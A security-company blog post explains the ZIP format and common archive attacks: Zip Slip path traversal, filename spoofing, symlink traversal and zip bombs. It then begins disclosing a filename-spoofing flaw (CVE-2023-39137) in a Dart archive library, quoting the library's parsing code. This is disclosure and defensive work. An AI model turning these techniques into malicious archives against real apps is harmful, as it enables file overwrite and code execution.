<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400&family=Quicksand:wght@400&display=swap"
          rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vuetify@2.6.13/dist/vuetify.min.css"/>
    <link rel="stylesheet" href="https://cdn.materialdesignicons.com/6.4.95/css/materialdesignicons.min.css">

    <title>  ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter | Ostorlab: Mobile App Security Testing for Android and iOS
</title>
    <link rel="canonical" href="https://blog.ostorlab.co/zip-packages-exploitation.html">

    <meta name="twitter:site" content="@OstorlabSec"/>
    <meta name="twitter:title" content="Ostorlab: Mobile App Security Testing for Android and iOS"/>
    <meta name="twitter:card" content="summary_large_image"/>
    <meta name="twitter:image" content="https://blog.ostorlab.co/favicon-32x32.png"/>
    <meta name="twitter:image:alt" content=""/>


    <link rel="apple-touch-icon" href="https://blog.ostorlab.co/apple-touch-icon.png" sizes="180x180">
    <link rel="icon" type="image/png" href="https://blog.ostorlab.co/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://blog.ostorlab.co/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="https://blog.ostorlab.co/manifest.json">
    <meta name="theme-color" content="#333333">

    <link rel="stylesheet" href="https://blog.ostorlab.co/theme/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://blog.ostorlab.co/theme/css/pygments/default.min.css">
    <link rel="stylesheet" href="https://blog.ostorlab.co/theme/css/theme.css">

  <link rel="alternate" type="application/atom+xml" title="Full Atom Feed"
        href="https://blog.ostorlab.co/feeds/all.atom.xml">
  <link rel="alternate" type="application/rss+xml" title="Full RSS Feed"
        href="https://blog.ostorlab.co/feed/rss.xml">  <link rel="alternate" type="application/atom+xml" title="Atom Feed"
        href="https://blog.ostorlab.co/feed/atom.xml">  
  <meta name="description" content="Recent in-depth investigations reveal serious vulnerabilities discovered in widely-used zip packages in Flutter and Swift, posing serious security risks for thousands of developers and applications. Our article delves into the technical aspects of these vulnerabilities, explaining their discovery, implications and mitigation strategies.">
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-HNPCZLGFHF"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-HNPCZLGFHF');
  </script>


</head>

<body>
<div id="app">
<header style="border-bottom:1px solid hsla(210,18%,87%,1);">
    <nav>
        <div class="header">
            <v-container>
                <v-app-bar flat dense color="#00000000">
                    <a href="https://ostorlab.co/">
                        <v-img class="rounded" style="max-width: 40px" src=https://blog.ostorlab.co/static/img/ostorlab_logo.png width=50
                               alt="Ostorlab: Mobile App Security Testing for Android and iOS"></v-img>
                    </a>
                    <v-icon size="32px" style="opacity: 0.3;">
                        mdi-slash-forward
                    </v-icon>
                    <h2 class="font-weight-bold" style="font-size: 24px">
                        <a style="color: inherit" href="https://blog.ostorlab.co/">
                            Blog
                        </a>
                    </h2>
                    <v-spacer></v-spacer>
                    <v-row no-gutters class="justify-center hidden-md-and-down">
                        <v-col cols="auto" class="align-self-center">
                            <v-btn text href="https://blog.ostorlab.co/category/engineering.html" text
                                   class="font-weight-bold text-capitalize">Engineering
                            </v-btn>
                            <v-btn text href="https://blog.ostorlab.co/category/product.html" text
                                   class="font-weight-bold text-capitalize">Product
                            </v-btn>
                            <v-btn text href="https://blog.ostorlab.co/category/security.html" text
                                   class="font-weight-bold text-capitalize">Security
                            </v-btn>
                            <v-btn text href="https://docs.ostorlab.co" text
                                   class="font-weight-bold text-capitalize">Documentation
                            </v-btn>

                            <v-btn text href="https://blog.ostorlab.co/changelog.html" text
                                   class="font-weight-bold text-capitalize">Changelog
                            </v-btn>

                        </v-col>
                    </v-row>
                    <v-spacer></v-spacer>
                    <div class="hidden-md-and-down">
                        <v-btn href="https://report.ostorlab.co/account/login" outlined large
                               class="ml-3 py-6 px-8 text-none font-weight-bold xlargefont">Login
                        </v-btn>
                        <v-btn dark color="#148BBF" href="https://ostorlab.co/demo" large
                               class="ml-3 py-6 px-8 text-none font-weight-bold xlargefont">Demo
                        </v-btn>
                    </div>
                    <v-btn
                            v-if="$vuetify.breakpoint.mdAndDown"
                            icon
                            color="white"
                            x-large
                            name="Navigation Menu Button"
                            aria-label="Navigation Menu Button"
                            @click="isDrawerOpen=!isDrawerOpen"
                    >
                        <v-icon>mdi-menu</v-icon>
                    </v-btn>

                </v-app-bar>
                <v-navigation-drawer
                        v-if="$vuetify.breakpoint.mdAndDown"
                        v-model="isDrawerOpen"
                        style="z-index: 2"
                        color="blue darken-4"
                        absolute
                >
                    <v-list dense>
                        <v-list-item
                                key="category/engineering.html"
                                href="https://blog.ostorlab.co/category/engineering.html"
                                class="text-none font-weight-bold ml-6"
                        >
                            <v-list-item-content>
                                <v-list-item-title class="font-weight-bold">
                                    Engineering
                                </v-list-item-title>
                            </v-list-item-content>
                        </v-list-item>
                        <v-list-item
                                key="category/product.html"
                                href="https://blog.ostorlab.co/category/product.html"
                                class="text-none font-weight-bold ml-6"
                        >
                            <v-list-item-content>
                                <v-list-item-title class="font-weight-bold">
                                    Product
                                </v-list-item-title>
                            </v-list-item-content>
                        </v-list-item>
                        <v-list-item
                                key="category/security.html"
                                href="https://blog.ostorlab.co/category/security.html"
                                class="text-none font-weight-bold ml-6"
                        >
                            <v-list-item-content>
                                <v-list-item-title class="font-weight-bold">
                                    Security
                                </v-list-item-title>
                            </v-list-item-content>
                        </v-list-item>
                        <v-list-item
                                href="https://docs.ostorlab.co"
                                class="text-none font-weight-bold ml-6"
                        >
                            <v-list-item-content>
                                <v-list-item-title class="font-weight-bold">
                                    Documentation
                                </v-list-item-title>
                            </v-list-item-content>
                        </v-list-item>
                        <v-list-item
                                href="https://blog.ostorlab.co/changelog.html"
                                class="text-none font-weight-bold ml-6"
                        >
                            <v-list-item-content>
                                <v-list-item-title class="font-weight-bold">
                                    Changelog
                                </v-list-item-title>
                            </v-list-item-content>
                        </v-list-item>

                        <v-list-item>
                            <v-list-item-content>
                                <v-btn depressed outlined color="black" href='https://report.ostorlab.co/account/login'
                                       class="text-none font-weight-bold" normal>
                                    Login
                                </v-btn>
                            </v-list-item-content>
                        </v-list-item>
                        <v-list-item>
                            <v-list-item-content>
                                <v-btn depressed dark color="#148BBF" href="https://ostorlab.co/contact"
                                       class="text-none font-weight-bold" normal>
                                    Demo
                                </v-btn>
                            </v-list-item-content>
                        </v-list-item>
                    </v-list>
                </v-navigation-drawer>
            </v-container>
        </div>
    </nav>
</header>    <div>
      <div class="d-flex df-bg-primary" style="height: 100vh; position: relative;">
        <v-container class="mx-auto align-self-end article-hero-container">
            <p class="df-heading-small df-text-gradient-green-blue font-weight-bold mb-3">
                <a href="https://blog.ostorlab.co/category/security.html">Security</a>
            </p>
            <div class="mb-14 article-hero-container-text">
                <h1 class="article-hero-title">ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter</h1>
                <p class="mt-7" style="font-size: 1rem;"><p>Recent in-depth investigations reveal serious vulnerabilities discovered in widely-used zip packages in Flutter and Swift, posing serious security risks for thousands of developers and applications. Our article delves into the technical aspects of these vulnerabilities, explaining their discovery, implications and mitigation strategies.</p></p>
            </div>
            <div class="article-hero-container-img">
                  <v-img
                      src=static/img/archive_zip/zip_hexdump_header.png
                      alt="ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter"
                      cover
                      height="100%"
                      width="100%"
                      style="border-radius: 7px"
                  >
            </div>
        </v-container>
    </div>
        <div class="main">
            <div class="container">
                <h1></h1>
  <article class="article">
      <div class="d-flex flex-column">
            <div class="d-flex mb-2">
                <div>
                    <p class="mb-1 df-text-grey-muted article-metadata">Author</p>
                    <div class="d-flex flex-wrap">
                            <a href="https://blog.ostorlab.co/author/ostorlab-team.html" class="d-flex align-center article-metadata font-weight-bold">
                                <p class="mb-0 d-block">Ostorlab Team</p>
                            </a>                    </div>
                </div>
                <div class="ml-auto d-flex align-center">
                    <div class="line-vertical"></div>
                    <code class="ml-10 mb-0 df-text-grey-muted">
                        Fri 04 August 2023
                    </code>
                </div>
            </div>
            <v-divider style="border: 1px solid #0081ba">
      </div>
      <v-row class="justify-space-around mt-5 mt-md-10">
          <v-col cols="12" lg="1" class="social-icons pt-0">
              <v-btn icon href="https://github.com/Ostorlab" target="blank" aria-label="Ostorlab's GitHub Profile">
                  <v-icon large style="color: #000000">mdi-github</v-icon>
              </v-btn>
              <v-btn icon href="https://www.linkedin.com/company/ostorlab/" target="blank" aria-label="Ostorlab's LinkedIn Page">
                  <v-icon large style="color: #0073B1">mdi-linkedin</v-icon>
              </v-btn>
              <v-btn icon href="https://www.instagram.com/ostorlab.co/" target="blank" aria-label="Ostorlab's Instagram Page">
                <v-img
                    src="../static/img/instagram.png"
                    alt="Instagram Logo"
                    height="40"
                    width="40"
                    contain
                />
              </v-btn>
              <v-btn icon href="https://twitter.com/OstorlabSec" target="blank" aria-label="Ostorlab's Twitter Profile">
                  <v-icon large style="color: #1C96E9">mdi-twitter</v-icon>
              </v-btn>
              <v-btn icon href="https://www.youtube.com/channel/UCW1SEYFstjaXqfvoFYDuVyw" target="blank" aria-label="Ostorlab's YouTube Channel">
                  <v-icon large style="color: #F70000">mdi-youtube</v-icon>
              </v-btn>
          </v-col>
          <v-col cols="12" :lg="$vuetify.breakpoint.lgAndUp ? 8 : 11">
              <div class="content mt-n3">
                <h1 id="introduction">Introduction</h1>
<p>ZIP packages are compressed archives that contain multiple files and directories, allowing developers to conveniently bundle resources, libraries, and other components required for app functionality. While ZIP packages offer efficiency and ease of use, they can also be the source of potential security vulnerabilities that malicious actors can exploit.</p>
<p>This article will delve into the security of zip-handling implementation, showcasing vulnerabilities in popular Zip libraries in the Swift and Dart (Flutter) ecosystems. We will explore the potential risks associated with malicious ZIP packages and the consequences they can have on mobile application security. Furthermore, we will discuss best practices and effective strategies to ensure the robust protection of ZIP packages throughout the development lifecycle.</p>
<h1 id="anatomy of zip file">Anatomy of ZIP file</h1>
<p>ZIP files typically follow this layout:</p>
<div class="highlight"><pre><span></span><code>+------------------------------------------------------+
<span class="p">|</span><span class="w">                  </span>Local<span class="w"> </span>File<span class="w"> </span>Header<span class="w">                   </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Local<span class="w"> </span>File<span class="w"> </span>Header<span class="w"> </span>Signature<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">       </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Version<span class="w"> </span>Needed<span class="w"> </span>to<span class="w"> </span>Extract<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">         </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>General<span class="w"> </span>Purpose<span class="w"> </span>Bit<span class="w"> </span>Flag<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">          </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Compression<span class="w"> </span>Method<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Last<span class="w"> </span>Mod<span class="w"> </span>Time<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                     </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Last<span class="w"> </span>Mod<span class="w"> </span>Date<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                     </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>CRC-32<span class="w"> </span>Checksum<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                   </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Compressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                   </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Uncompressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                 </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Filename<span class="w"> </span>Length<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                  </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Extra<span class="w"> </span>Field<span class="w"> </span>Length<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">               </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Filename<span class="w"> </span><span class="o">(</span>variable<span class="w"> </span>length<span class="o">)</span><span class="w">                         </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">                                                  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Extra<span class="w"> </span>Field<span class="w"> </span><span class="o">(</span>variable<span class="w"> </span>length<span class="o">)</span><span class="w">                      </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">                                                  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w">               </span>Compressed<span class="w"> </span>Data<span class="w">                          </span><span class="p">|</span>
<span class="p">|</span><span class="w">                                                      </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Data<span class="w"> </span>Descriptor<span class="w"> </span><span class="o">(</span>optional<span class="o">)</span><span class="w">                        </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+------------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>CRC-32<span class="w"> </span>Checksum<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Compressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">                </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Uncompressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+------------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
+------------------------------------------------------+
+------------------------------------------------------+
<span class="p">|</span><span class="w">                </span>Central<span class="w"> </span>Directory<span class="w">                      </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Central<span class="w"> </span>Directory<span class="w"> </span>File<span class="w"> </span>Header<span class="w">              </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+--------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Central<span class="w"> </span>Directory<span class="w"> </span>Header<span class="w"> </span>Signature<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Version<span class="w"> </span>Made<span class="w"> </span>by<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">            </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Version<span class="w"> </span>Needed<span class="w"> </span>to<span class="w"> </span>Extract<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>General<span class="w"> </span>Purpose<span class="w"> </span>Bit<span class="w"> </span>Flag<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">   </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>...<span class="w">                                </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+--------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>CRC-32<span class="w"> </span>Checksum<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">            </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Compressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">            </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Uncompressed<span class="w"> </span>Size<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">          </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Filename<span class="w"> </span>Length<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>bytes<span class="o">)</span><span class="w">            </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>...<span class="w">                                </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+--------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Filename<span class="w"> </span><span class="o">(</span>variable<span class="w"> </span>length<span class="o">)</span><span class="w">           </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">                                    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>+--------------------------------------+<span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
+------------------------------------------------------+
+------------------------------------------------------+
<span class="p">|</span><span class="w">       </span>End<span class="w"> </span>of<span class="w"> </span>Central<span class="w"> </span>Directory<span class="w"> </span>Record<span class="w">                </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>End<span class="w"> </span>of<span class="w"> </span>Central<span class="w"> </span>Directory<span class="w"> </span>Signature<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="w"> </span>bytes<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>...<span class="w">                                        </span><span class="p">|</span><span class="w">     </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>+----------------------------------------------+<span class="w">     </span><span class="p">|</span>
+------------------------------------------------------+
</code></pre></div>
<p>Notable parts of the zip structure are:</p>
<ul>
<li>
<p><strong>Local File Header:</strong> The Local File Header is a section at the beginning of each file within a ZIP archive. It contains essential information about the compressed file, such as its name, size, compression method, and other attributes. This header allows the software to locate and extract individual files from the ZIP archive.</p>
</li>
<li>
<p><strong>Data Descriptor:</strong> The Data Descriptor is an optional section within the ZIP file format. It provides additional information about a file's compressed data. The purpose of the Data Descriptor is to store the CRC-32 checksum of the uncompressed data, the compressed size, and the uncompressed size. Including this information allows for integrity checks and can be useful when extracting files.</p>
</li>
<li>
<p><strong>Central Directory File Header:</strong> The Central Directory File Header is a section in a ZIP file that contains metadata about each file within the archive. It provides details such as the file name, compressed size, uncompressed size, compression method, and other attributes. The Central Directory File Header is located in the central directory structure, a catalog of all the files in the ZIP archive.</p>
</li>
<li>
<p><strong>End of Central Directory Record (EOCD):</strong> The End of Central Directory (EOCD) Record is a section at the end of a ZIP file that marks the end of the central directory structure. It contains essential information, including the number of entries in the central directory, the size of the central directory, and the offset to the start of the central directory. The EOCD record allows the software to locate and access the central directory, which provides information about the files in the ZIP archive.</p>
</li>
</ul>
<h1 id="common zip vulnerabilities:">Common ZIP vulnerabilities:</h1>
<ul>
<li>
<p><strong>ZIP path traversal</strong>: Zip path traversal, also known as Zip Slip, is a security vulnerability that occurs when the application fails to validate zip entries' file names during extraction. It allows an attacker to extract files to arbitrary locations outside the extraction directory, which helps overwrite sensitive user data and, in some cases, can lead to code execution if an attacker overwrites an application's shared object file.</p>
</li>
<li>
<p><strong>ZIP filename spoofing</strong>: In the context of ZIP archives, there are two main data structures relevant to file names: the <code>Central Directory Entry</code> and the <code>Local File Header</code>, if a parser for example, reads the filename from <code>Local File Header</code> but then proceeds to extract the file with the path in the <code>Central Directory Entry</code>.</p>
</li>
<li>
<p><strong>ZIP symlink path traversal</strong>: ZIP symlink is a feature used in many zip utilities that allows those symlinks to point to files outside the extraction directory. This can pose a security risk, leading to overwriting sensitive data or shared object files, which might lead to code execution.</p>
</li>
<li>
<p><strong>ZIP Bomb</strong>: A zip bomb is a small-sized zip file that contains an enormous amount of compressed data. When extracted, it expands into a huge file or consumes excessive system resources, potentially causing denial-of-service (DoS).</p>
</li>
</ul>
<h1 id="zip packages to analyze">ZIP packages to analyze</h1>
<h2 id="archive">Archive</h2>
<p>One of the popular flutter packages for handling compressed files is <code>archive</code> by Brendan Duncan, this package implements popular archive formats natively in Dart without having to go through the native platform-specific packages like <code>java.util.zip</code> for android or <code>ZIPFoundation</code> for iOS.</p>
<p>Language: <strong>Dart (Flutter)</strong><br/>
Link: <a href="https://pub.dev/packages/archive">https://pub.dev/packages/archive</a></p>
<h2 id="flutter_archive">Flutter_archive</h2>
<p><code>flutter_archive</code> is another Flutter package for compressed files that work exclusively with zip files, this package relies on Java's native zip package <code>java.util.zip</code> by leveraging Flutter's <code>MethodChannel</code>.</p>
<p>Language: <strong>Dart (Flutter)</strong><br/>
Link: <a href="https://pub.dev/packages/flutter_archive">https://pub.dev/packages/flutter_archive</a></p>
<h2 id="zipfoundation">ZIPFoundation</h2>
<p><code>ZIPFoundation</code> is a library to create, read and modify ZIP archive files. It is written in Swift and based on Apple's libcompression for high performance and energy efficiency.</p>
<p>Language: <strong>Swift</strong><br/>
Link: <a href="https://github.com/weichsel/ZIPFoundation">https://github.com/weichsel/ZIPFoundation</a></p>
<h2 id="zip">ZIP</h2>
<p><code>Zip</code> is a Swift framework for zipping and unzipping files. Simple and quick to use. Built on top of minizip.</p>
<p>Language: <strong>Swift</strong><br/>
Link: <a href="https://github.com/marmelroy/Zip">https://github.com/marmelroy/Zip</a></p>
<h2 id="ziparchive (ssziparchive)">ZIPArchive (SSZIPArchive)</h2>
<p>ZipArchive is a simple utility class for zipping and unzipping files on iOS, macOS and tvOS.</p>
<p>Language: <strong>Swift</strong><br/>
Link: <a href="https://github.com/ZipArchive/ZipArchive">https://github.com/ZipArchive/ZipArchive</a></p>
<h1 id="detected vulnerabilities_1">Detected vulnerabilities</h1>
<h2 id="package: archive">Package: <a href="https://github.com/brendan-duncan/archive">Archive</a></h2>
<h3 id="zip filename spoofing (cve-2023-39137)">ZIP filename spoofing (CVE-2023-39137)</h3>
<p><code>archive</code> package only parses the filename from the <code>Local File Header</code>, this leads to inconsistency with most zip parsers who typically favor <code>Central Directory Entry</code>, this inconsistency can be abused by attackers who can craft a malicious zip file with different file names in <code>Local File Header</code> and <code>Central Directory Entry</code>, consequently having a file with different filenames before and after extraction.</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="kt">String</span><span class="w"> </span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="p">;</span>
<span class="w">  </span><span class="n">List</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="w"> </span><span class="n">extraField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">  </span><span class="kt">String</span><span class="w"> </span><span class="n">fileComment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="p">;</span>
<span class="w">  </span><span class="n">ZipFile</span><span class="o">?</span><span class="w"> </span><span class="n">file</span><span class="p">;</span>

<span class="w">  </span><span class="n">ZipFileHeader</span><span class="p">(</span>
<span class="w">      </span><span class="p">[</span><span class="n">InputStreamBase</span><span class="o">?</span><span class="w"> </span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">InputStreamBase</span><span class="o">?</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="kt">String</span><span class="o">?</span><span class="w"> </span><span class="n">password</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">versionMadeBy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">versionNeededToExtract</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">generalPurposeBitFlag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
<span class="w">      </span><span class="n">compressionMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">readUint16</span><span class="p">();</span>
